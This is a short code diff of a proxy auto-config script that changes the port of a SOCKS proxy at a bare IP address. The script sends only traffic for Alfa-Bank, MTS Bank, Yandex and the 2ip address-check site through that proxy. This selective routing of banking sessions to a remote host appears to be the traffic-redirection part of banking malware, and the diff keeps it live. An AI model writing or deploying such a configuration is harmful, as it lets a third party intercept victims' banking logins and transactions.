@@ -20,7 +20,7 @@ function FindProxyForURL(url, host)
     isAlfaBank = dnsDomainIs(host, ".alfabank.ru");
 
     if (isYandex || is2ip || isMTSBank || isAlfaBank) {
-        return "SOCKS 88.212.235.223:3128";
+        return "SOCKS 88.212.235.223:4467";
     }
 
     return "DIRECT";
